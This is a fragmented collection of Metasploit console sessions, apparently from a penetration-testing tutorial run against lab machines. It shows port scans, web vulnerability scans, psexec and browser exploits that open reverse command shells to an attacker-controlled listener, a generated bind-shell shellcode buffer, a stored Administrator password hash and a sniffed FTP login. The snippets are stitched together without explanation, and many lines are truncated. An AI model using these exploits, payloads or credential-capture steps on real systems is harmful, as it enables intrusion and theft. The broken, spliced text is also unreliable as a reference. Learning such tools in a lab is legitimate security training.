auxiliary - 151 post\n+ -- --=[ 252 payloads - 28 encoders - 8 nops\n       =[ svn r15767 updated today (2012.08.22)\n\nRHOST => 172.16.194.172\nPAYLOAD > cmd/unix/reverse\n[*] Started reverse double handler\n[*] Accepted the first client connection...\n[*] Accepted the second client connection...\n[*] Command: echo cSKqD83oiquo0xMr;\n[*] Writing to socket A\n[*] Writing to socket B\n[*] Reading from sockets...\n[*] Reading from socket B\n[*] B: "cSKqD83oiquo0xMr\\r\\n"\n[*] Matching...\n[*] A is input...\n[*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:57682)\n\nuname -a\nLinux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 G\n\nroot@kali:~# msfcli exploit/multi/samba/usermap_script O\n[*] Initializing modules...\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST                   yes       The target address\n   RPORT  139              yes       The target port\n\nmsf exploit(ms08_067_netapi) > show options\n\nModule options (exploit/windows/smb/ms08_067_netapi):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   RHOST    172.16.194.134   yes       The target address\n   RPORT    445              yes       Set the SMB service port\n   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Automatic Targeting\n\nmsf exploit(ms08_067_netapi) > check\n\n[*] Verifying vulnerable status... (path: 0x0000005a)\n[*] System is not vulnerable (status: 0x00000000)\n[*] The target is not exploitable.\nmsf  exploit(ms08_067_netapi) >\n\nmsf > connect 192.168.1.1 23\n[*] Connected to 192.168.1.1:23\nDD-WRT v24 std (c) 2008 NewMedia-NET GmbH\nRelease: 07/27/08 (SVN revision: 10011)\nDD-WRT login:\n\nmsf exploit(ms10_061_spoolss) > edit\n[*] Launching /usr/bin/vim /usr/share/metasploit-framework/modules/exploits/wind\n\nrequire \'msf/core\'\nrequire \'msf/windows_error\'\n\nclass Metasploit3 > Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  def initialize(info = {})\n\nmsf > irb\n[*] Starting IRB shell...\n\n>> puts "Hello, metasploit!"\nHello, metasploit!\n=> nil\n>> Framework::Version\n=> "4.8.2-2014022601"\n\nmeterpreter > route\n\nNetwork routes\n==============\n\n    Subnet           Netmask          Gateway\n    ------           -------          -------\n    0.0.0.0          0.0.0.0          172.16.1.254\n    127.0.0.0        255.0.0.0        127.0.0.1\n    172.16.1.0       255.255.255.0    172.16.1.100\n    172.16.1.100     255.255.255.255  127.0.0.1\n    172.16.255.255   255.255.255.255  172.16.1.100\n    224.0.0.0        240.0.0.0        172.16.1.100\n    255.255.255.255  255.255.255.255  172.16.1.100\n\nmsf > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf > set THREADS 50\nTHREADS => 50\nmsf > set\n\nGlobal\n======\n\n  Name     Value\n  ----     -----\n  RHOSTS   192.168.1.0/24\n  THREADS  50\n\nmsf > unset THREADS\nUnsetting THREADS...\nmsf > unset all\nFlushing datastore...\nmsf > set\n\nGlobal\n======\n\nNo entries in data store.\n\nmsf > setg LHOST 192.168.1.101\nLHOST => 192.168.1.101\nmsf > setg RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf > setg RHOST 192.168.1.136\nRHOST => 192.168.1.136\n\nmsf > show nops\nNOP Generators\n==============\n\n   Name             Disclosure Date  Rank    Description\n   ----             ---------------  ----    -----------\n   armle/simple                      normal  Simple\n   mipsbe/better                     normal  Better\n   php/generic                       normal  PHP Nop Generator\n   ppc/simple                        normal  Simple\n   sparc/random                      normal  SPARC NOP Generator\n   tty/generic                       normal  TTY Nop Generator\n   x64/simple                        normal  Simple\n   x86/opty2                         normal  Opty2\n   x86/single_byte                   normal  Single Byte\n\n\nmsf > use dos/windows/smb/ms09_001_write\nmsf auxiliary(ms09_001_write) > show options\n\nModule options:\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST                   yes       The target address\n   RPORT  445              yes       Set the SMB service port\n\nmsf auxiliary(ms09_001_write) >\n\nmsf > use exploit/windows/smb/psexec\nmsf exploit(psexec) > set RHOST 192.168.1.100\nRHOST => 192.168.1.100\nmsf exploit(psexec) > set PAYLOAD windows/shell/reverse_tcp\nPAYLOAD => windows/shell/reverse_tcp\nmsf exploit(psexec) > set LHOST 192.168.1.5\nLHOST => 192.168.1.5\nmsf exploit(psexec) > set LPORT 4444\nLPORT => 4444\nmsf exploit(psexec) > set SMBUSER victim\nSMBUSER => victim\nmsf exploit(psexec) > set SMBPASS s3cr3t\nSMBPASS => s3cr3t\nmsf exploit(psexec) > exploit\n\n[*] Connecting to the server...\n[*] Started reverse handler\n[*] Authenticating as user \'victim\'...\n[*] Uploading payload...\n[*] Created \\hikmEeEM.exe...\n[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\\\n[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.1.100[\\sv\n[*] Obtaining a service manager handle...\n[*] Creating a new service (ciWyCVEp - "MXAVZsCqfRtZwScLdexnD")...\n[*] Closing service handle...\n[*] Opening service...\n[*] Starting the service...\n[*] Removing the service...\n[*] Closing service handle...\n[*] Deleting \\hikmEeEM.exe...\n[*] Sending stage (240 bytes)\n[*] Command shell session 1 opened (192.168.1.5:4444 -> 192.168.1.100:1073)\n\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\WINDOWS\\system32>\n\nmsf > use exploit/windows/browser/ani_loadimage_chunksize\nmsf exploit(ani_loadimage_chunksize) > set URIPATH /\nURIPATH => /\nmsf exploit(ani_loadimage_chunksize) > set PAYLOAD windows/shell/reverse_tcp\nPAYLOAD => windows/shell/reverse_tcp\nmsf exploit(ani_loadimage_chunksize) > set LHOST 192.168.1.5\nLHOST => 192.168.1.5\nmsf exploit(ani_loadimage_chunksize) > set LPORT 4444\nLPORT => 4444\nmsf exploit(ani_loadimage_chunksize) > exploit\n[*] Exploit running as background job.\n\n[*] Started reverse handler\n[*] Using URL: http://0.0.0.0:8080/\n[*]  Local IP: http://192.168.1.5:8080/\n[*] Server started.\nmsf exploit(ani_loadimage_chunksize) >\n[*] Attempting to exploit ani_loadimage_chunksize\n[*] Sending HTML page to 192.168.1.100:1077...\n[*] Attempting to exploit ani_loadimage_chunksize\n[*] Sending Windows ANI LoadAniIcon() Chunk Size Stack Overflow (HTTP) to 192.16\n[*] Sending stage (240 bytes)\n[*] Command shell session 2 opened (192.168.1.5:4444 -> 192.168.1.100:1078)\n\nmsf exploit(ani_loadimage_chunksize) > sessions -i 2\n[*] Starting interaction with 2...\n\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp.\n\nC:\\Documents and Settings\\victim\\Desktop>\n\nmsf > use  exploit/windows/smb/ms09_050_smb2_negotiate_func_index\nmsf exploit(ms09_050_smb2_negotiate_func_index) > help\n...snip...\nExploit Commands\n================\n\n    Command       Description\n    -------       -----------\n    check         Check to see if a target is vulnerable\n    exploit       Launch an exploit attempt\n    pry           Open a Pry session on the current module\n    reload        Just reloads the module\n    rerun         Alias for rexploit\n    rexploit      Reloads the module and launches an exploit attempt\n    run           Alias for exploit\n\nmsf exploit(ms09_050_smb2_negotiate_func_index) >\n\n\nmsf exploit(ms09_050_smb2_negotiate_func_index) > show options\n\nModule options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   RHOST                   yes       The target address\n   RPORT  445              yes       The target port (TCP)\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows Vista SP1/SP2 and Server 2008 (x86)\n\nmsf exploit(ms09_050_smb2_negotiate_func_index) > show evasion\nModule evasion options:\n\n   Name                           Current Setting  Required  Description\n   ----                           ---------------  --------  -----------\n   SMB::obscure_trans_pipe_level  0                yes       Obscure PIPE string\n   SMB::pad_data_level            0                yes       Place extra padding\n   SMB::pad_file_level            0                yes       Obscure path names \n   SMB::pipe_evasion              false            yes       Enable segmented re\n   SMB::pipe_read_max_size        1024             yes       Maximum buffer size\n   SMB::pipe_read_min_size        1                yes       Minimum buffer size\n   SMB::pipe_write_max_size       1024             yes       Maximum buffer size\n   SMB::pipe_write_min_size       1                yes       Minimum buffer size\n   TCP::max_send_size             0                no        Maxiumum tcp segmen\n   TCP::send_delay                0                no        Delays inserted bef\n\nmsf payload(shell_bind_tcp) > generate\n# windows/shell_bind_tcp - 341 bytes\n# http://www.metasploit.com\n# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, \n# InitialAutoRunScript=, AutoRunScript=\nbuf = \n"\\xfc\\xe8\\x89\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xd2\\x64\\x8b\\x52" +\n"\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26" +\n"\\x31\\xff\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d" +\n"\\x01\\xc7\\xe2\\xf0\\x52\\x57\\x8b\\x52\\x10\\x8b\\x42\\x3c\\x01\\xd0" +\n"\\x8b\\x40\\x78\\x85\\xc0\\x74\\x4a\\x01\\xd0\\x50\\x8b\\x48\\x18\\x8b" +\n"\\x58\\x20\\x01\\xd3\\xe3\\x3c\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff" +\n"\\x31\\xc0\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf4\\x03\\x7d" +\n"\\xf8\\x3b\\x7d\\x24\\x75\\xe2\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b" +\n"\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44" +\n"\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x58\\x5f\\x5a\\x8b" +\n"\\x12\\xeb\\x86\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\\x77\\x73\\x32\\x5f" +\n"\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\\x90\\x01\\x00\\x00\\x29" +\n"\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\\xff\\xd5\\x50\\x50\\x50\\x50" +\n"\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\\xdf\\xe0\\xff\\xd5\\x89\\xc7\\x31" +\n"\\xdb\\x53\\x68\\x02\\x00\\x11\\x5c\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68" +\n"\\xc2\\xdb\\x37\\x67\\xff\\xd5\\x53\\x57\\x68\\xb7\\xe9\\x38\\xff\\xff" +\n"\\xd5\\x53\\x53\\x57\\x68\\x74\\xec\\x3b\\xe1\\xff\\xd5\\x57\\x89\\xc7" +\n"\\x68\\x75\\x6e\\x4d\\x61\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\\xe3" +\n"\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\\xc7\\x44" +\n"\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\\x54\\x50\\x56" +\n"\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\\x79\\xcc\\x3f\\x86" +\n"\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\\x68\\x08\\x87\\x1d\\x60" +\n"\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5" +\n"\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f" +\n"\\x6a\\x00\\x53\\xff\\xd5"\n\nmsf > hosts\n\nHosts\n=====\n\naddress         mac                name            os_name  os_flavor  os_sp  pu\n-------         ---                ----            -------  ---------  -----  --\n172.16.194.134                                     Unknown                    de\n172.16.194.163                     172.16.194.163  Linux    Ubuntu            se\n172.16.194.172  00:0C:29:D1:62:80  172.16.194.172  Linux    Ubuntu            se\n\nmsf > services -p 21\n\nServices\n========\n\nhost            port  proto  name  state  info\n----            ----  -----  ----  -----  ----\n172.16.194.172  21    tcp    ftp   open   vsftpd 2.3.4\n\nmsf > db_nmap -A 172.16.194.134\n[*] Nmap: Starting Nmap 5.51SVN ( http://nmap.org ) at 2012-06-18 12:36 EDT\n[*] Nmap: Nmap scan report for 172.16.194.134\n[*] Nmap: Host is up (0.00031s latency).\n[*] Nmap: Not shown: 994 closed ports\n[*] Nmap: PORT     STATE SERVICE      VERSION\n[*] Nmap: 80/tcp   open  http         Apache httpd 2.2.17 ((Win32) mod_ssl/2.2.1\n[*] Nmap: HOP RTT     ADDRESS\n[*] Nmap: 1   0.31 ms 172.16.194.134\n[*] Nmap: OS and Service detection performed. Please report any incorrect result\n[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 14.91 seconds\nmsf >\n\nmsf > hosts\n\nHosts\n=====\n\naddress         mac                name  os_name            os_flavor  os_sp  pu\n-------         ---                ----  -------            ---------  -----  --\n172.16.194.134  00:0C:29:68:51:BB        Microsoft Windows  XP                se\n172.16.194.172  00:0C:29:D1:62:80        Linux              Ubuntu            se\n\nmsf > \nmsf >  db_export -h\nUsage:\n    db_export -f  [-a] [filename]\n    Format can be one of: xml, pwdump\n[-] No output file was specified\n\nmsf > db_export -f xml /root/msfu/Exported.xml\n[*] Starting export of workspace msfu to /root/msfu/Exported.xml [ xml ]...\n[*]     >> Starting export of report\n[*]     >> Starting export of hosts\n[*]     >> Starting export of events\n[*]     >> Starting export of services\n[*]     >> Starting export of credentials\n[*]     >> Starting export of web sites\n[*]     >> Starting export of web pages\n[*]     >> Starting export of web forms\n[*]     >> Starting export of web vulns\n[*]     >> Finished export of report\n[*] Finished export of workspace msfu to /root/msfu/Exported.xml [ xml ]...\n\nmsf  auxiliary(tcp) > hosts -c address,os_flavor -S Linux -R\n\nHosts\n=====\n\naddress         os_flavor\n-------         ---------\n172.16.194.172  Ubuntu\n\nRHOSTS => 172.16.194.172\n\nmsf  auxiliary(tcp) > run\n\n[*] 172.16.194.172:25 - TCP OPEN\n[*] 172.16.194.172:23 - TCP OPEN\n[*] 172.16.194.172:22 - TCP OPEN\n[*] 172.16.194.172:21 - TCP OPEN\n[*] 172.16.194.172:53 - TCP OPEN\n[*] 172.16.194.172:80 - TCP OPEN\n[*] 172.16.194.172:5432 - TCP OPEN\n[*] 172.16.194.172:5900 - TCP OPEN\n[*] 172.16.194.172:6000 - TCP OPEN\n[*] 172.16.194.172:6667 - TCP OPEN\n[*] 172.16.194.172:6697 - TCP OPEN\n[*] 172.16.194.172:8009 - TCP OPEN\n[*] 172.16.194.172:8180 - TCP OPEN\n[*] 172.16.194.172:8787 - TCP OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf > services -c port,proto,state -p 70-81\nServices\n========\nhost           port proto state\n----           ---- ----- -----\n172.16.194.134 80   tcp   open\n172.16.194.172 75   tcp   closed\n172.16.194.172 71   tcp   closed\n172.16.194.172 72   tcp   closed\n172.16.194.172 73   tcp   closed\n172.16.194.172 74   tcp   closed\n172.16.194.172 70   tcp   closed\n172.16.194.172 76   tcp   closed\n172.16.194.172 77   tcp   closed\n172.16.194.172 78   tcp   closed\n172.16.194.172 79   tcp   closed\n172.16.194.172 80   tcp   open\n172.16.194.172 81   tcp  closed\n\nmsf > services -s http -c port 172.16.194.134 -o /root/msfu/http.csv\n\n[*] Wrote services to /root/msfu/http.csv\n\nmsf > hosts -S Linux -o /root/msfu/linux.csv\n[*] Wrote hosts to /root/msfu/linux.csv\n\nmsf > cat /root/msfu/linux.csv\n[*] exec: cat /root/msfu/linux.csv\n\naddress,mac,name,os_name,os_flavor,os_sp,purpose,info,comments\n"172.16.194.172","00:0C:29:D1:62:80","","Linux","Debian","","server","",""\n\nmsf > cat /root/msfu/http.csv\n[*] exec: cat /root/msfu/http.csv\n\nhost,port\n"172.16.194.134","80"\n"172.16.194.134","443"\n\nmsf > creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b43\n[*] Time: 2012-06-20 20:31:42 UTC Credential: host=172.16.194.134 port=445 proto\n\nmsf > creds\n\nCredentials\n===========\n\nhost            port  user           pass                                       \n----            ----  ----           ----                                       \n172.16.194.134  445   Administrator  7bf4f254b222bb24aad3b435b51404ee:2892d26cdf\n\n[*] Found 1 credential.\n\nmeterpreter > ls\n\nListing: C:\\Documents and Settings\\victim\n=========================================\n\nMode              Size     Type  Last modified                   Name\n----              ----     ----  -------------                   ----\n40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .\n40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..\n100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.\n40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Dat\n\n\n\nmeterpreter> > resource resource.txt\n[*] Reading /root/resource.txt\n[*] Running ls\n\nListing: C:\\Documents and Settings\\Administrator\\Desktop\n========================================================\n\nMode              Size    Type  Last modified              Name\n----              ----    ----  -------------              ----\n40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .\n40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..\n100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk\n100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe\n100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability S\n100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.l\n\n[*] Running background\n\n[*] Backgrounding session 1...\nmsf  exploit(handler) >\nmsf > use auxiliary/scanner/portscan/syn\nmsf auxiliary(syn) > show options\n\nModule options (auxiliary/scanner/portscan/syn):\n\n   Name       Current Setting  Required  Description\n   ----       ---------------  --------  -----------\n   BATCHSIZE  256              yes       The number of hosts to scan per set\n   DELAY      0                yes       The delay between connections, per thre\n   INTERFACE                   no        The name of the interface\n   JITTER     0                yes       The delay jitter factor (maximum value \n   PORTS      1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS                      yes       The target address range or CIDR identi\n   SNAPLEN    65535            yes       The number of bytes to capture\n   THREADS    1                yes       The number of concurrent threads\n   TIMEOUT    500              yes       The reply read timeout in milliseconds\n\nmsf auxiliary(syn) > set INTERFACE eth0\nINTERFACE => eth0\nmsf auxiliary(syn) > set PORTS 80\nPORTS => 80\nmsf auxiliary(syn) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(syn) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(syn) > run\n\n[*] TCP OPEN 192.168.1.1:80\n[*] TCP OPEN 192.168.1.2:80\n[*] TCP OPEN 192.168.1.10:80\n[*] TCP OPEN 192.168.1.109:80\n[*] TCP OPEN 192.168.1.116:80\n[*] TCP OPEN 192.168.1.150:80\n[*] Scanned 256 of 256 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf > use auxiliary/scanner/portscan/tcp\nmsf  auxiliary(tcp) > show options\n\nModule options (auxiliary/scanner/portscan/tcp):\n\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   CONCURRENCY  10               yes       The number of concurrent ports to che\n   DELAY        0                yes       The delay between connections, per th\n   JITTER       0                yes       The delay jitter factor (maximum valu\n   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS                        yes       The target address range or CIDR iden\n   THREADS      1                yes       The number of concurrent threads\n   TIMEOUT      1000             yes       The socket connect timeout in millise\n\nmsf  auxiliary(tcp) > hosts -R\n\nHosts\n=====\n\naddress         mac                name  os_name  os_flavor  os_sp  purpose  inf\n-------         ---                ----  -------  ---------  -----  -------  ---\n172.16.194.172  00:0C:29:D1:62:80        Linux    Ubuntu            server      \n\nRHOSTS => 172.16.194.172\n\nmsf  auxiliary(tcp) > show options\n\nModule options (auxiliary/scanner/portscan/tcp):\n\n   Name         Current Setting  Required  Description\n   ----         ---------------  --------  -----------\n   CONCURRENCY  10               yes       The number of concurrent ports to che\n   FILTER                        no        The filter string for capturing traff\n   INTERFACE                     no        The name of the interface\n   PCAPFILE                      no        The name of the PCAP capture file to \n   PORTS        1-1024           yes       Ports to scan (e.g. 22-25,80,110-900)\n   RHOSTS       172.16.194.172   yes       The target address range or CIDR iden\n   SNAPLEN      65535            yes       The number of bytes to capture\n   THREADS      10                yes       The number of concurrent threads\n   TIMEOUT      1000             yes       The socket connect timeout in millise\n\nmsf  auxiliary(tcp) > run\n\n[*] 172.16.194.172:25 - TCP OPEN\n[*] 172.16.194.172:23 - TCP OPEN\n[*] 172.16.194.172:22 - TCP OPEN\n[*] 172.16.194.172:21 - TCP OPEN\n[*] 172.16.194.172:53 - TCP OPEN\n[*] 172.16.194.172:80 - TCP OPEN\n[*] 172.16.194.172:111 - TCP OPEN\n[*] 172.16.194.172:139 - TCP OPEN\n[*] 172.16.194.172:445 - TCP OPEN\n[*] 172.16.194.172:514 - TCP OPEN\n[*] 172.16.194.172:513 - TCP OPEN\n[*] 172.16.194.172:512 - TCP OPEN\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\nmsf  auxiliary(tcp) > \nmsf auxiliary(ipidseq) > set RHOSTS 192.168.1.0/24\nRHOSTS => 192.168.1.0/24\nmsf auxiliary(ipidseq) > set THREADS 50\nTHREADS => 50\nmsf auxiliary(ipidseq) > run\n\n[*] 192.168.1.1\'s IPID sequence class: All zeros\n[*] 192.168.1.2\'s IPID sequence class: Incremental!\n[*] 192.168.1.10\'s IPID sequence class: Incremental!\n[*] 192.168.1.104\'s IPID sequence class: Randomized\n[*] 192.168.1.109\'s IPID sequence class: Incremental!\n[*] 192.168.1.111\'s IPID sequence class: Incremental!\n[*] 192.168.1.114\'s IPID sequence class: Incremental!\n[*] 192.168.1.116\'s IPID sequence class: All zeros\n[*] 192.168.1.124\'s IPID sequence class: Incremental!\n[*] 192.168.1.123\'s IPID sequence class: Incremental!\n[*] 192.168.1.137\'s IPID sequence class: All zeros\n[*] 192.168.1.150\'s IPID sequence class: All zeros\n[*] 192.168.1.151\'s IPID sequence class: Incremental!\n[*] Auxiliary module execution completed\n\nmsf auxiliary(ipidseq) > nmap -Pn -sI 192.168.1.109 192.168.1.114\n[*] exec: nmap -Pn -sI 192.168.1.109 192.168.1.114\n\nStarting Nmap 5.00 ( http://nmap.org ) at 2009-08-14 05:51 MDT\nIdle scan using zombie 192.168.1.109 (192.168.1.109:80); Class: Incremental\nInteresting ports on 192.168.1.114:\nNot shown: 996 closed|filtered ports\nPORT STATE SERVICE\n135/tcp open msrpc\n139/tcp open netbios-ssn\n445/tcp open microsoft-ds\n3389/tcp open ms-term-serv\nMAC Address: 00:0C:29:41:F2:E8 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 5.56 seconds\nmsf > services -p 21 -c name,proto\n\nServices\n========\n\nhost            name  proto\n----            ----  -----\n172.16.194.172  ftp   tcp\n\nmsf > use auxiliary/scanner/ftp/ftp_version \n\nmsf  auxiliary(ftp_version) > set RHOSTS 172.16.194.172\nRHOSTS => 172.16.194.172\n\nmsf  auxiliary(anonymous) > show options\nModule options (auxiliary/scanner/ftp/anonymous):\n\n   Name     Current Setting      Required  Description\n   ----     ---------------      --------  -----------\n   FTPPASS  mozilla@example.com  no        The password for the specified userna\n   FTPUSER  anonymous            no        The username to authenticate as\n   RHOSTS   172.16.194.172       yes       The target address range or CIDR iden\n   RPORT    21                   yes       The target port\n   THREADS  1                    yes       The number of concurrent threads\n\nmsf  auxiliary(anonymous) > run\n[*] 172.16.194.172:21 Anonymous READ (220 (vsFTPd 2.3.4))\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed\n\nmsf auxiliary(psnuffle) > run\n[*] Auxiliary module execution completed\n[*] Loaded protocol FTP from /usr/share/metasploit-framework/data/exploits/psnuf\n[*] Loaded protocol IMAP from /usr/share/metasploit-framework/data/exploits/psnu\n[*] Loaded protocol POP3 from /usr/share/metasploit-framework/data/exploits/psnu\n[*] Loaded protocol URL from /usr/share/metasploit-framework/data/exploits/psnuf\n[*] Sniffing traffic.....\n[*] Successful FTP Login: 192.168.1.100:21-192.168.1.5:48614 >> victim / pass (2\n\nmsf > wmap_sites -h\n[*]  Usage: wmap_targets [options]\n  -h        Display this help text\n  -a [url]  Add site (vhost,url)\n  -l        List all available sites\n  -s [id]   Display site structure (vhost,url|ids) (level)\n\nmsf > wmap_sites -a http://172.16.194.172\n[*] Site created.\nmsf > wmap_sites -l\n[*] Available sites\n===============\n     Id  Host            Vhost           Port  Proto  # Pages  # Forms\n     --  ----            -----           ----  -----  -------  -------\n     0   172.16.194.172  172.16.194.172  80    http   0        0\n\nmsf > wmap_targets -l\n[*] Defined targets\n===============\n\n     Id  Vhost           Host            Port  SSL    Path\n     --  -----           ----            ----  ---    ----\n     0   172.16.194.172  172.16.194.172  80    false  /mutillidae/index.php\n\nmsf > wmap_run -t\n\n[*] Testing target:\n[*]   Site: 192.168.1.100 (192.168.1.100)\n[*]   Port: 80 SSL: false\n[*] ============================================================\n[*] Testing started. 2012-01-16 15:46:42 -0500\n[*] \n=[ SSL testing ]=\n[*] ============================================================\n[*] Target is not SSL. SSL modules disabled.\n[*] \n=[ Web Server testing ]=\n[*] ============================================================\n[*] Loaded auxiliary/admin/http/contentkeeper_fileaccess ...\n[*] Loaded auxiliary/admin/http/tomcat_administration ...\n[*] Loaded auxiliary/admin/http/tomcat_utf8_traversal ...\n[*] Loaded auxiliary/admin/http/trendmicro_dlp_traversal ...\n\nmsf >\nmsf > wmap_run -e\n[*] Using ALL wmap enabled modules.\n[-] NO WMAP NODES DEFINED. Executing local modules\n[*] Testing target:\n[*]   Site: 172.16.194.172 (172.16.194.172)\n[*]   Port: 80 SSL: false\n============================================================\n[*] Testing started. 2012-06-27 09:29:13 -0400\n[*] \n=[ SSL testing ]=\n============================================================\n[*] Target is not SSL. SSL modules disabled.\n[*] \n=[ Web Server testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/http_version\n\n[*] Module auxiliary/scanner/http/open_proxy\n[*] Module auxiliary/scanner/http/robots_txt\n[*] Module auxiliary/scanner/http/soap_xml\n[*] Path: /\n[*] Module auxiliary/scanner/http/trace_axd\n[*] Path: /\n[*] Module auxiliary/scanner/http/verb_auth_bypass\n[*] \n=[ Unique Query testing ]=\n============================================================\n[*] Module auxiliary/scanner/http/blind_sql_query\n[*] Module auxiliary/scanner/http/error_sql_injection\n[*] Module auxiliary/scanner/http/http_traversal\n[*] Module auxiliary/scanner/http/rails_mass_assignment\n[*] Module exploit/multi/http/lcms_php_exec\n[*] \n=[ Query testing ]=\n============================================================\n[*] \n=[ General testing ]=\n============================================================\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\nLaunch completed in 212.01512002944946 seconds.\n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n[*] Done.\n\nmsf > wmap_vulns -l\n[*] + [172.16.194.172] (172.16.194.172): scraper /\n[*]   scraper Scraper\n[*]   GET Metasploitable2 - Linux\n[*] + [172.16.194.172] (172.16.194.172): directory /dav/\n[*]   directory Directory found.\n[*]   GET Res code: 200\n[*] + [172.16.194.172] (172.16.194.172): directory /cgi-bin/\n[*]   directory Directoy found.\n[*]   GET Res code: 403\n\nmsf > db_import /root/Nessus/nessus_scan.nbe\n[*] Importing \'Nessus NBE Report\' data\n[*] Importing host 172.16.194.254\n[*] Importing host 172.16.194.254\n[*] Importing host 172.16.194.254\n[*] Importing host 172.16.194.2\n[*] Importing host 172.16.194.2\n[*] Importing host 172.16.194.2\n...snip...\n[*] Importing host 172.16.194.1\n[*] Importing host 172.16.194.1\n[*] Importing host 172.16.194.1\n[*] Importing host 172.16.194.1\n[*] Importing host 172.16.194.1\n[*] Successfully imported /root/Nessus/nessus_scan.nbe\nmsf > \nmsf > services 172.16.194.172\n\nServices\n========\n\nhost            port   proto  name            state  info\n----            ----   -----  ----            -----  ----\n172.16.194.172  21     tcp    ftp             open   \n172.16.194.172  22     tcp    ssh             open   \n172.16.194.172  23     tcp    telnet          open   \n172.16.194.172  25     tcp    smtp            open   \n172.16.194.172  53     udp    dns             open   \n172.16.194.172  53     tcp    dns             open   \n172.16.194.172  69     udp    tftp            open   \n172.16.194.172  80     tcp    www             open   \n172.16.194.172  111    tcp    rpc-portmapper  open   \n172.16.194.172  111    udp    rpc-portmapper  open   \n172.16.194.172  137    udp    netbios-ns      open   \n172.16.194.172  139    tcp    smb             open   \n172.16.194.172  445    tcp    cifs            open   \n172.16.194.172  512    tcp    rexecd          open   \n172.16.194.172  513    tcp    rlogin          open   \n172.16.194.172  514    tcp    rsh             open   \n172.16.194.172  1099   tcp    rmi_registry    open   \n172.16.194.172  1524   tcp                    open   \n172.16.194.172  2049   tcp    rpc-nfs         open   \n172.16.194.172  2049   udp    rpc-nfs         open   \n172.16.194.172  2121   tcp    ftp             open   \n172.16.194.172  3306   tcp    mysql           open   \n172.16.194.172  5432   tcp    postgresql      open   \n172.16.194.172  5900   